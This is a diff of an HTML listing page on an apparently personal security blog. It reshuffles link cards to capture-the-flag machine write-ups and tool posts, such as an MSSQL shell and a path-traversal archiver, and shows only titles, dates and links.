+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1327,25 +1379,25 @@ Password: pfsense</code></pre></div></p>
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
            
           
            
@@ -1452,6 +1504,8 @@ Password: pfsense</code></pre></div></p>
            
            
           
+          
+           
            
            
            
@@ -1459,15 +1513,9 @@ Password: pfsense</code></pre></div></p>
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1475,15 +1523,9 @@ Password: pfsense</code></pre></div></p>
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1491,27 +1533,63 @@ Password: pfsense</code></pre></div></p>
            
            
            
+           
+          
+           
+           
+           
+           
           
            
            
            
+           
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1602,276 +1680,136 @@ Password: pfsense</code></pre></div></p>
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -1898,6 +1836,46 @@ Password: pfsense</code></pre></div></p>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2105,17 +2083,32 @@ Password: pfsense</code></pre></div></p>
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -2237,20 +2230,45 @@ Password: pfsense</code></pre></div></p>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
